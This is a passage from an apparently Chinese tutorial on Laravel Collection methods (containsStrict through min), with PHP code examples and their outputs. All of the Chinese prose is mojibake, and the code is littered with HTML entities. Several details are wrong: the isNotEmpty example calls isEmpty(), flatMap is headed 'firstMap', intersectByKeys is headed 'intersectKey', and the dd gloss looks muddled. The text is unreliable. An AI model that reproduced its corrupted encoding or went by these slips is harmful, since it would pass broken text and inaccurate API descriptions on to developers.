¼æ¨¡å¼ã€åˆ¤æ–­é›†åˆæ˜¯å¦åŒ…å«ç»™å®šçš„é¡¹ç›®ï¼š åŸºæœ¬ä½¿ç”¨ï¼š 123456$collection = collect([ ['name' =&gt; 'boo', 'age' =&gt; 25], ['name' =&gt; 'yumi', 'age' =&gt; 23],]);$collection-&gt;containsStrict(\"age\", \"25\"); // false å¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œæ•°ç»„å€¼å­˜åœ¨ï¼Œä½†æ˜¯å€¼ç±»å‹ä¸ä¸€è‡´ä¹Ÿè¿”å›falseã€‚ countè¿”å›è¯¥é›†åˆå†…çš„é¡¹ç›®æ€»æ•°ã€‚ 1collect([1, 2, 3, 4])-&gt;count(); // 4 countByç»Ÿè®¡é›†åˆä¸­æ¯ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 1234$collection = collect([1, 2, 2, 2, 3, 5, 5]);$counted = $collection-&gt;countBy();$counted-&gt;all();// [1 =&gt; 1, 2 =&gt; 3, 3 =&gt; 1, 5=&gt;2] è¿›é˜¶ç”¨æ³•ï¼Œè‡ªå®šä¹‰è§„åˆ™ï¼Œç»Ÿè®¡å…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼š 123456$collection &#x3D; collect([&#39;alice@gmail.com&#39;, &#39;bob@yahoo.com&#39;, &#39;carlos@gmail.com&#39;]);$counted &#x3D; $collection-&gt;countBy(function ($email) &#123; return substr(strrchr($email, &quot;@&quot;), 1);&#125;);$counted-&gt;all();&#x2F;&#x2F; [&#39;gmail.com&#39; &#x3D;&gt; 2, &#39;yahoo.com&#39; &#x3D;&gt; 1] crossJoinè¿”å›æŒ‡å®šé›†åˆçš„å¯èƒ½çš„ç¬›å¡å°”ç§¯ã€‚ 123456789101112131415161718192021222324252627282930313233$collection = collect([1, 2]);$matrix = $collection-&gt;crossJoin(['a', 'b']);$matrix-&gt;all();/* [ [1, 'a'], [1, 'b'], [2, 'a'], [2, 'b'], ]*/$collection = collect([1, 2]);$matrix = $collection-&gt;crossJoin(['a', 'b'], ['I', 'II']);$matrix-&gt;all();/* [ [1, 'a', 'I'], [1, 'a', 'II'], [1, 'b', 'I'], [1, 'b', 'II'], [2, 'a', 'I'], [2, 'a', 'II'], [2, 'b', 'I'], [2, 'b', 'II'], ]*/ ddå¤‡ä»½æ–‡ä»¶ç³»ç»Ÿå’Œåœæ­¢ç³»ç»Ÿï¼ˆdump and dieï¼‰çš„ç¼©å†™ï¼Œæ‰“å°é›†åˆå…ƒç´ å¹¶ä¸­æ–­è„šæœ¬æ‰§è¡Œã€‚ 12$collection = collect(['John Doe', 'Jane Doe']);$collection-&gt;dd(); å¦‚æœä¸æƒ³ä¸­æ–­æ‰§è¡Œè„šæœ¬ï¼Œè¯·ä½¿ç”¨dumpæ–¹æ³•æ›¿ä»£ã€‚ dumpæ‰“å°é›†åˆé¡¹è€Œä¸ç»ˆæ­¢è„šæœ¬æ‰§è¡Œã€‚ 123456789101112$collection = collect(['John Doe', 'Jane Doe']);$collection-&gt;dump();/* Collection &#123; #items: array:2 [ 0 =&gt; \"John Doe\" 1 =&gt; \"Jane Doe\" ] &#125;*/ diffä¸ç»™å®šçš„é›†åˆæˆ–è€…æ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼ŒåŸºäºå€¼æ±‚å·®é›†ã€‚ å°†é›†åˆä¸å…¶å®ƒé›†åˆæˆ–çº¯ PHP æ•°ç»„è¿›è¡Œå€¼çš„æ¯”è¾ƒï¼Œç„¶åè¿”å›åŸé›†åˆä¸­å­˜åœ¨è€Œç»™å®šé›†åˆä¸­ä¸å­˜åœ¨çš„å€¼ï¼š 12$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;diff([2, 4, 6, 8])-&gt;all(); // [1, 3, 5] diffAssocä¸ç»™å®šçš„é›†åˆæˆ–è€…æ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼ŒåŸºäºé”®å€¼å¯¹æ±‚å·®é›†ã€‚ è¿”å›åŸé›†åˆä¸å­˜åœ¨äºç»™å®šé›†åˆä¸­çš„é”®å€¼å¯¹ï¼š 1234567891011121314$collection = collect([ 'color' =&gt; 'orange', 'type' =&gt; 'fruit', 'remain' =&gt; 6]);$diff = $collection-&gt;diffAssoc([ 'color' =&gt; 'yellow', 'type' =&gt; 'fruit', 'remain' =&gt; 3, 'used' =&gt; 6]);$diff-&gt;all(); // ['color' =&gt; 'orange', 'remain' =&gt; 6] diffKeysä¸ç»™å®šçš„é›†åˆæˆ–è€…æ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼ŒåŸºäºé”®æ±‚å·®é›†ã€‚ è¿”å›åŸé›†åˆä¸­å­˜åœ¨è€Œç»™å®šçš„é›†åˆä¸­ä¸å­˜åœ¨ã€Œé”®ã€æ‰€å¯¹åº”çš„é”®å€¼å¯¹ï¼š 12345678910111213141516$collection = collect([ 'one' =&gt; 10, 'two' =&gt; 20, 'three' =&gt; 30, 'four' =&gt; 40, 'five' =&gt; 50,]);$diff = $collection-&gt;diffKeys([ 'two' =&gt; 2, 'four' =&gt; 4, 'six' =&gt; 6, 'eight' =&gt; 8,]);$diff-&gt;all(); // ['one' =&gt; 10, 'three' =&gt; 30, 'five' =&gt; 50] duplicatesä»é›†åˆä¸­æ£€ç´¢å¹¶è¿”å›é‡å¤çš„å€¼ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 123$collection = collect(['a', 'b', 'a', 'c', 'b']);$collection-&gt;duplicates();// [2 =&gt; 'a', 4 =&gt; 'b'] å¦‚æœé›†åˆåŒ…å«æ•°ç»„æˆ–å¯¹è±¡ï¼Œåˆ™å¯ä»¥ä¼ é€’å¸Œæœ›æ£€æŸ¥é‡å¤å€¼çš„å±æ€§çš„é”®ï¼š 12345678$employees = collect([ ['email' =&gt; 'abigail@example.com', 'position' =&gt; 'Developer'], ['email' =&gt; 'james@example.com', 'position' =&gt; 'Designer'], ['email' =&gt; 'victoria@example.com', 'position' =&gt; 'Developer'],])$employees-&gt;duplicates('position');// [2 =&gt; 'Developer'] duplicates æ–¹æ³•åœ¨æ£€æŸ¥é¡¹ç›®å€¼æ—¶ä½¿ç”¨ã€Œå®½æ¾ã€æ¯”è¾ƒï¼Œç›¸åduplicatesStrict æ–¹æ³•åˆ™æ˜¯ä½¿ç”¨ã€Œä¸¥æ ¼ã€æ¯”è¾ƒè¿›è¡Œè¿‡æ»¤ã€‚ eachè¿­ä»£é›†åˆä¸­çš„å†…å®¹å¹¶å°†å…¶ä¼ é€’åˆ°å›è°ƒå‡½æ•°ä¸­ã€‚ 123456$collection = $collection-&gt;each(function ($item, $key) &#123; // å¦‚æœè¦ä¸­æ–­å¯¹å†…å®¹çš„è¿­ä»£ï¼Œé‚£å°±ä»å›è°ƒä¸­è¿”å› false if (/* some condition */) &#123; return false; &#125;&#125;); eachSpreadåŒæ ·æ˜¯éå†é›†åˆï¼Œä¸è¿‡ä¸each çš„åŒºåˆ«åœ¨äºï¼Œå¯¹äºå¤šç»´æ•°ç»„ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°å…ƒç´ ã€‚ 12345678910111213141516171819202122$collection = collect([['Boo', 25, \"men\"], ['Yumi', 23, \"woman\"]]);$collection-&gt;eachSpread(function ($name, $age, $gender) &#123; var_dump($name, $age, $gender); // Booã€25ã€men // Yumiã€23ã€woman&#125;);$collection-&gt;each(function ($item, $key)&#123; // åŒæ ·å¯ä»¥åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œè¿”å›false ï¼Œç»ˆæ­¢å¾ªç¯ var_dump($item, $key);&#125;);/* array(3) &#123; [0]=&gt; string(3) \"Boo\" [1]=&gt; int(25) [2]=&gt; string(3) \"men\" &#125;*/ everyæ£€æŸ¥é›†åˆä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ æ˜¯å¦é€šè¿‡æŒ‡å®šæ¡ä»¶ï¼š 12345collect([1, 2, 3, 4])-&gt;every(function ($value, $key) &#123; return $value &gt; 2;&#125;);&#x2F;&#x2F; false æ³¨æ„ï¼šå¦‚æœé›†åˆä¸ºç©ºï¼Œ every å°†è¿”å› trueã€‚ exceptè¿”å›é›†åˆä¸­é™¤äº†æŒ‡å®šé”®ä»¥å¤–çš„æ‰€æœ‰é¡¹ç›®ã€‚ 123$collection = collect(['product_id' =&gt; 1, 'price' =&gt; 100, 'discount' =&gt; false]);$filtered = $collection-&gt;except(['price', 'discount']);$filtered-&gt;all(); // ['product_id' =&gt; 1] ä¸ä¹‹ç›¸åçš„æ–¹æ³•æ˜¯ only()ã€‚ filterä½¿ç”¨ç»™å®šçš„å›è°ƒå‡½æ•°è¿‡æ»¤é›†åˆçš„å†…å®¹ï¼Œåªç•™ä¸‹é‚£äº›é€šè¿‡çš„å…ƒç´ ã€‚ 123456$collection = collect([1, 2, 3, 4]);$filtered = $collection-&gt;filter(function ($value, $key) &#123; // å½“é—­åŒ…è¿”å›true æ—¶ï¼Œä¿ç•™ä¸€ä¸ªæ¡ç›® return $value &gt; 2;&#125;);$filtered-&gt;all(); // [3, 4] å¦‚æœæ²¡æœ‰æä¾›å›è°ƒå‡½æ•°ï¼Œé›†åˆä¸­æ‰€æœ‰è¿”å›falseçš„å…ƒç´ éƒ½ä¼šè¢«ç§»é™¤ï¼š 12$collection = collect([1, 2, 3, null, false, '', 0, []]);$collection-&gt;filter()-&gt;all(); // [1, 2, 3] ä¸ä¹‹ç›¸åçš„æ–¹æ³•æ˜¯ reject()ã€‚ firstè¿”å›é›†åˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 1collect([1, 2, 3, 4])-&gt;first(); // 1 åŒæ ·å¯ä»¥ä¼ å…¥å›è°ƒå‡½æ•°ï¼Œè¿›è¡Œæ¡ä»¶é™åˆ¶ï¼š 1234collect([1, 2, 3, 4])-&gt;first(function ($value, $key) &#123; // å½“é—­åŒ…è¿”å›true æ—¶ï¼Œä¿ç•™ä¸€ä¸ªæ¡ç›® return $value &gt; 2;&#125;); // 3 å¦‚æœéœ€è¦è¿”å›æœ€åä¸€ä¸ªå…ƒç´ å¯ä»¥ä½¿ç”¨last() æ–¹æ³•ã€‚ firstWhereè¿”å›é›†åˆä¸­å«æœ‰æŒ‡å®šé”® / å€¼å¯¹çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼š 12345678910$collection = collect([ ['name' =&gt; 'Regena', 'age' =&gt; null], ['name' =&gt; 'Linda', 'age' =&gt; 14], ['name' =&gt; 'Diego', 'age' =&gt; 23], ['name' =&gt; 'Linda', 'age' =&gt; 84],]);// è¿”å›name = Linda çš„ç¬¬ä¸€ä¸ªå…ƒç´ $collection-&gt;firstWhere('name', 'Linda');// ['name' =&gt; 'Linda', 'age' =&gt; 14] è¿˜å¯ä»¥åœ¨firstWhere ä¸­ä½¿ç”¨ç®—æœ¯è¿ç®—ç¬¦ï¼š 12$collection-&gt;firstWhere('age', '&gt;=', 18);// ['name' =&gt; 'Diego', 'age' =&gt; 23] å’Œ where æ–¹æ³•ä¸€æ ·ï¼Œä½ å¯ä»¥å°†ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™ firstWhere æ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ firstWhere æ–¹æ³•å°†è¿”å›æŒ‡å®šé”®çš„å€¼ä¸ºã€ŒçœŸã€çš„ç¬¬ä¸€ä¸ªé›†åˆé¡¹ï¼š 12$collection-&gt;firstWhere('age');// ['name' =&gt; 'Linda', 'age' =&gt; 14] firstMapéå†é›†åˆå¹¶å°†å…¶ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°ç»™å®šçš„å›è°ƒã€‚ å¯ä»¥é€šè¿‡å›è°ƒä¿®æ”¹æ¯ä¸ªå€¼çš„å†…å®¹å†è¿”å›å‡ºæ¥ï¼Œä»è€Œå½¢æˆä¸€ä¸ªæ–°çš„è¢«ä¿®æ”¹è¿‡å†…å®¹çš„é›†åˆï¼š 12345678910$collection = collect([ ['name' =&gt; 'Sally'], ['school' =&gt; 'Arkansas'], ['age' =&gt; 28]]);$flattened = $collection-&gt;flatMap(function ($values) &#123; return array_map('strtoupper', $values);&#125;);$flattened-&gt;all();// ['name' =&gt; 'SALLY', 'school' =&gt; 'ARKANSAS', 'age' =&gt; '28']; flattenå°†å¤šç»´é›†åˆè½¬ä¸ºä¸€ç»´ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 123$collection = collect(['name' =&gt; 'taylor', 'languages' =&gt; ['php', 'javascript']]);$collection-&gt;flatten()-&gt;all(); // ['taylor', 'php', 'javascript']; è¿˜å¯ä»¥é€‰æ‹©æ€§åœ°ä¼ å…¥ã€Œæ·±åº¦ã€å‚æ•°ï¼š 12345678910111213141516171819$collection = collect([ 'Apple' =&gt; [ ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'], ], 'Samsung' =&gt; [ ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'] ],]);$products = $collection-&gt;flatten(1);$products-&gt;values()-&gt;all();/*[ ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'], ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'],]*/ åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œè°ƒç”¨ flatten æ–¹æ³•æ—¶ä¸ä¼ å…¥æ·±åº¦å‚æ•°çš„è¯ä¹Ÿä¼šå°†åµŒå¥—æ•°ç»„è½¬æˆä¸€ç»´çš„ï¼Œç„¶åè¿”å› [&#39;iPhone 6S&#39;, &#39;Apple&#39;, &#39;Galaxy S7&#39;, &#39;Samsung&#39;]ï¼Œä¼ å…¥æ·±åº¦å‚æ•°èƒ½é™åˆ¶è®¾ç½®è¿”å›æ•°ç»„çš„å±‚æ•°ã€‚ flipé”®å€¼åè½¬ã€‚ 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;flip()-&gt;all(); // [\"boo\" =&gt; \"name\", 25 =&gt; \"age\"] forgeté€šè¿‡ç»™å®šçš„é”®æ¥ç§»é™¤æ‰é›†åˆä¸­å¯¹åº”çš„å†…å®¹ã€‚ 1234$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$collection-&gt;forget('name');$collection-&gt;all(); // ['framework' =&gt; 'laravel'] ä¸å¤§å¤šæ•°é›†åˆçš„æ–¹æ³•ä¸åŒï¼Œforget() ä¸ä¼šè¿”å›ä¿®æ”¹è¿‡åçš„æ–°é›†åˆï¼›å®ƒä¼šç›´æ¥ä¿®æ”¹åŸæ¥çš„é›†åˆã€‚ getè¿”å›ç»™å®šé”®çš„é¡¹ç›®ã€‚ åŸºæœ¬ç”¨æ³•ï¼Œå¦‚æœè¯¥é”®ä¸å­˜åœ¨ï¼Œåˆ™è¿”å› nullï¼š 12$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$value = $collection-&gt;get('name'); // taylor å¯ä»¥ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºé»˜è®¤å€¼ï¼š 12$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$value = $collection-&gt;get('foo', 'boo'); // boo ç”šè‡³å¯ä»¥å°†å›è°ƒå‡½æ•°å½“ä½œé»˜è®¤å€¼ã€‚å¦‚æœæŒ‡å®šçš„é”®ä¸å­˜åœ¨ï¼Œå°±ä¼šè¿”å›å›è°ƒçš„ç»“æœï¼š 12345$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$collection-&gt;get('email', function () &#123; return 'boo';&#125;); // boo groupByæ ¹æ®ç»™å®šçš„é”®å¯¹é›†åˆå†…çš„é¡¹ç›®è¿›è¡Œåˆ†ç»„ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 123456789101112131415161718192021$collection = collect([ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],]);$grouped = $collection-&gt;groupBy('account_id');$grouped-&gt;all();/* [ 'account-x10' =&gt; [ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ], 'account-x11' =&gt; [ ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'], ], ]*/ åŒæ ·å¯ä»¥ä¼ å…¥ä¸€ä¸ªå›è°ƒå‡½æ•°æ¥ä»£æ›¿å­—ç¬¦ä¸²çš„ã€é”®ã€ï¼Œæ ¹æ®è¯¥å›è°ƒå‡½æ•°çš„è¿”å›å€¼æ¥è¿›è¡Œåˆ†ç»„ï¼š 1234567891011121314151617$grouped = $collection-&gt;groupBy(function ($item, $key) &#123; return substr($item['account_id'], -3);&#125;);$grouped-&gt;all();/* [ 'x10' =&gt; [ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ], 'x11' =&gt; [ ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'], ], ]*/ ç”šè‡³å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œå¤šå±‚åˆ†ç»„ï¼š 1234567891011121314151617181920212223242526272829303132333435363738$data = new Collection([ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], 30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']], 40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']],]);$result = $data-&gt;groupBy([ 'skill', function ($item) &#123; return $item['roles']; &#125;,], $preserveKeys = true);/*[ 1 =&gt; [ 'Role_1' =&gt; [ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], ], 'Role_2' =&gt; [ 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], ], 'Role_3' =&gt; [ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], ], ], 2 =&gt; [ 'Role_1' =&gt; [ 30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']], ], 'Role_2' =&gt; [ 40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']], ], ],];*/ hasåˆ¤æ–­é›†åˆä¸­æ˜¯å¦å­˜åœ¨ç»™å®šçš„é”®ã€‚ 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;has(\"name\"); // true implodeåˆå¹¶é›†åˆä¸­çš„é¡¹ç›®ã€‚ implode æ–¹æ³•ç”¨äºåˆå¹¶é›†åˆé¡¹ã€‚å…¶å‚æ•°å–å†³äºé›†åˆé¡¹çš„ç±»å‹ã€‚å¦‚æœé›†åˆåŒ…å«æ•°ç»„æˆ–å¯¹è±¡ï¼Œä½ åº”è¯¥ä¼ é€’ä½ å¸Œæœ›åˆå¹¶çš„å±æ€§çš„é”®ï¼Œä»¥åŠä½ å¸Œæœ›æ”¾åœ¨å€¼ä¹‹é—´ç”¨æ¥ã€Œæ‹¼æ¥ã€çš„å­—ç¬¦ä¸²ï¼š 1234567$collection = collect([ ['account_id' =&gt; 1, 'product' =&gt; 'Desk'], ['account_id' =&gt; 2, 'product' =&gt; 'Chair'],]);$collection-&gt;implode('product', ', ');// Desk, Chair å¦‚æœé›†åˆä¸­åŒ…å«ç®€å•çš„å­—ç¬¦ä¸²æˆ–æ•°å€¼ï¼Œåªéœ€è¦ä¼ å…¥ã€Œæ‹¼æ¥ã€ç”¨çš„å­—ç¬¦ä¸²ä½œä¸ºè¯¥æ–¹æ³•çš„å”¯ä¸€å‚æ•°å³å¯ï¼š 123collect([1, 2, 3, 4, 5])-&gt;implode('-');// '1-2-3-4-5' intersectä»åŸé›†åˆä¸­ç§»é™¤ä¸åœ¨ç»™å®šæ•°ç»„æˆ–é›†åˆä¸­çš„ã€ä»»ä½•å€¼ã€ï¼Œè¿”å›æ–°çš„é›†åˆå°†ä¿ç•™åŸé›†åˆçš„é”®ã€‚ 1234$collection = collect(['Desk', 'Sofa', 'Chair']);$intersect = $collection-&gt;intersect(['Desk', 'Chair', 'Bookcase']);$intersect-&gt;all();// [0 =&gt; 'Desk', 2 =&gt; 'Chair'] intersectKeyåˆ é™¤åŸé›†åˆä¸­ä¸å­˜åœ¨äºç»™å®šæ•°ç»„æˆ–é›†åˆä¸­çš„ã€ä»»ä½•é”®ã€ï¼Œè¿”å›æ–°çš„é›†åˆå°†ä¿ç•™åŸé›†åˆçš„é”®ã€‚ 123456789$collection = collect([ 'serial' =&gt; 'UX301', 'type' =&gt; 'screen', 'year' =&gt; 2009,]);$intersect = $collection-&gt;intersectByKeys([ 'reference' =&gt; 'UX404', 'type' =&gt; 'tab', 'year' =&gt; 2011,]);$intersect-&gt;all();// ['type' =&gt; 'screen', 'year' =&gt; 2009] isEmptyåˆ¤æ–­é›†åˆæ˜¯å¦ä¸ºç©ºã€‚ 1collect([])-&gt;isEmpty(); // true isNotEmptyåˆ¤æ–­é›†åˆæ˜¯å¦ä¸ä¸ºç©ºã€‚ 1collect([])-&gt;isEmpty(); // false joinå°†é›†åˆä¸­çš„å€¼ç”¨å­—ç¬¦ä¸²è¿æ¥ã€‚ 12345collect(['a', 'b', 'c'])-&gt;join(', '); // 'a, b, c'collect(['a', 'b', 'c'])-&gt;join(', ', ', and '); // 'a, b, and c'collect(['a', 'b'])-&gt;join(', ', ' and '); // 'a and b'collect(['a'])-&gt;join(', ', ' and '); // 'a'collect([])-&gt;join(', ', ' and '); // '' keyByä»¥ç»™å®šçš„é”®ä½œä¸ºé›†åˆçš„é”®ã€‚ 123456789101112131415$collection = collect([ ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],]);$keyed = $collection-&gt;keyBy('product_id');$keyed-&gt;all();/* [ 'prod-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], 'prod-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'], ]*/ è¿˜å¯ä»¥åœ¨è¿™ä¸ªæ–¹æ³•ä¼ é€’ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚è¯¥å›è°ƒå‡½æ•°è¿”å›çš„å€¼ä¼šä½œä¸ºè¯¥é›†åˆçš„é”®ï¼š 123456789101112$keyed = $collection-&gt;keyBy(function ($item) &#123; return strtoupper($item['product_id']);&#125;);$keyed-&gt;all();/* [ 'PROD-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], 'PROD-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'], ]*/ keysè¿”å›é›†åˆçš„æ‰€æœ‰é”®ã€‚ 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;keys()-&gt;all(); // [\"name\", \"age\"] lastè¿”å›é›†åˆä¸­é€šè¿‡ç»™å®šçœŸå®æµ‹è¯•çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä¸first æ–¹æ³•æ­£å¥½ç›¸åã€‚ 1234collect([1, 2, 3, 4])-&gt;last(function ($value, $key) &#123; return $value &lt; 3;&#125;);// 2 è¿˜å¯ä»¥è°ƒç”¨æ— å‚çš„ last æ–¹æ³•æ¥è·å–é›†åˆçš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœé›†åˆä¸ºç©ºã€‚è¿”å› nullï¼š 12collect([1, 2, 3, 4])-&gt;last();// 4 macroé™æ€ macro æ–¹æ³•å…è®¸ä½ åœ¨è¿è¡Œæ—¶æ·»åŠ æ–¹æ³•åˆ° Collection ç±»ï¼Œæ›´å¤šç»†èŠ‚å¯ä»¥æŸ¥çœ‹æ‰©å±•é›†åˆéƒ¨åˆ†æ–‡æ¡£ã€‚ makeé™æ€ make æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é›†åˆå®ä¾‹ï¼Œç»†èŠ‚å¯æŸ¥çœ‹åˆ›å»ºé›†åˆéƒ¨åˆ†æ–‡æ¡£ã€‚ mapéå†é›†åˆå¹¶å°†æ¯ä¸€ä¸ªå€¼ä¼ å…¥ç»™å®šçš„å›è°ƒï¼Œè¿”å›æ–°çš„é›†åˆã€‚ 12345678$collection = collect([1, 2, 3, 4, 5]);$multiplied = $collection-&gt;map(function ($item, $key) &#123; return $item * 2;&#125;);$multiplied-&gt;all();// [2, 4, 6, 8, 10] ä¸å…¶ä»–å¤§å¤šæ•°é›†åˆæ–¹æ³•ä¸€æ ·ï¼Œ map ä¼šè¿”å›ä¸€ä¸ªæ–°çš„é›†åˆå®ä¾‹ï¼›å®ƒä¸ä¼šä¿®æ”¹åŸé›†åˆã€‚å¦‚æœä½ æƒ³ä¿®æ”¹åŸé›†åˆï¼Œè¯·ä½¿ç”¨ transform æ–¹æ³•ã€‚ mapSpreadè¿­ä»£é›†åˆé¡¹ï¼Œä¼ é€’æ¯ä¸ªåµŒå¥—é›†åˆé¡¹å€¼åˆ°ç»™å®šå›è°ƒã€‚åœ¨å›è°ƒä¸­æˆ‘ä»¬å¯ä»¥ä¿®æ”¹é›†åˆé¡¹å¹¶å°†å…¶è¿”å›ï¼Œä»è€Œé€šè¿‡ä¿®æ”¹çš„å€¼ç»„åˆæˆä¸€ä¸ªæ–°çš„é›†åˆã€‚ 1234567891011$collection = collect([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);$chunks = $collection-&gt;chunk(2);$sequence = $chunks-&gt;mapSpread(function ($odd, $even) &#123; return $odd + $even;&#125;);$sequence-&gt;all();// [1, 5, 9, 13, 17] mapToGroupsé€šè¿‡æŒ‡å®šå›è°ƒå‡½æ•°å¯¹é›†åˆè¿›è¡Œåˆ†ç»„ï¼Œ 123456789101112131415161718192021222324252627282930$collection = collect([ [ 'name' =&gt; 'John Doe', 'department' =&gt; 'Sales', ], [ 'name' =&gt; 'Jane Doe', 'department' =&gt; 'Sales', ], [ 'name' =&gt; 'Johnny Doe', 'department' =&gt; 'Marketing', ]]);$grouped = $collection-&gt;mapToGroups(function ($item, $key) &#123; return [$item['department'] =&gt; $item['name']];&#125;);$grouped-&gt;all();/* [ 'Sales' =&gt; ['John Doe', 'Jane Doe'], 'Marketing' =&gt; ['Johnny Doe'], ]*/$grouped-&gt;get('Sales')-&gt;all();// ['John Doe', 'Jane Doe'] mapWithKeyså¯¹é›†åˆè¿›è¡Œè¿­ä»£å¹¶ä¼ é€’æ¯ä¸ªå€¼åˆ°ç»™å®šå›è°ƒï¼Œè¯¥å›è°ƒä¼šè¿”å›åŒ…å«é”®å€¼å¯¹çš„å…³è”æ•°ç»„ã€‚ 12345678910111213141516171819202122232425$collection = collect([ [ 'name' =&gt; 'John', 'department' =&gt; 'Sales', 'email' =&gt; 'john@example.com' ], [ 'name' =&gt; 'Jane', 'department' =&gt; 'Marketing', 'email' =&gt; 'jane@example.com' ]]);$keyed = $collection-&gt;mapWithKeys(function ($item) &#123; return [$item['email'] =&gt; $item['name']];&#125;);$keyed-&gt;all();/*[ 'john@example.com' =&gt; 'John', 'jane@example.com' =&gt; 'Jane',]*/ maxè¿”å›æŒ‡å®šé”®çš„æœ€å¤§å€¼ã€‚ 12$max = collect([['foo' =&gt; 10], ['foo' =&gt; 20]])-&gt;max('foo'); // 20$max = collect([1, 2, 3, 4, 5])-&gt;max(); // 5 medianè¿”å›æŒ‡å®šé”®çš„ä¸­é—´å€¼ã€‚ 12$median = collect([['foo' =&gt; 10], ['foo' =&gt; 10], ['foo' =&gt; 20], ['foo' =&gt; 40]])-&gt;median('foo'); // 15$median = collect([1, 1, 2, 4])-&gt;median(); // 1.5 mergeå°†ç»™å®šæ•°ç»„æˆ–é›†åˆåˆå¹¶åˆ°åŸé›†åˆã€‚ å¦‚æœç»™å®šçš„é›†åˆé¡¹çš„å­—ç¬¦ä¸²é”®ä¸åŸé›†åˆä¸­çš„å­—ç¬¦ä¸²é”®ç›¸åŒ¹é…ï¼Œåˆ™æŒ‡å®šé›†åˆé¡¹çš„å€¼å°†è¦†ç›–åŸé›†åˆçš„å€¼ï¼š 1234$collection = collect(['product_id' =&gt; 1, 'price' =&gt; 100]);$merged = $collection-&gt;merge(['price' =&gt; 200, 'discount' =&gt; false]);$merged-&gt;all();// ['product_id' =&gt; 1, 'price' =&gt; 200, 'discount' =&gt; false] å¦‚æœç»™å®šçš„é›†åˆé¡¹ä¸ºæ•°å­—ï¼Œåˆ™è¿™äº›å€¼å°†ä¼šè¿½åŠ åœ¨é›†åˆçš„æœ€åï¼š 1234$collection &#x3D; collect([&#39;Desk&#39;, &#39;Chair&#39;]);$merged &#x3D; $collection-&gt;merge([&#39;Bookcase&#39;, &#39;Door&#39;]);$merged-&gt;all();&#x2F;&#x2F; [&#39;Desk&#39;, &#39;Chair&#39;, &#39;Bookcase&#39;, &#39;Door&#39;] minè¿”å›æŒ‡å®šé”®çš„æœ€å°å€¼ã€‚ 1$min = collect([1, 2, 3, 4, 5])-&gt;min(); // 1 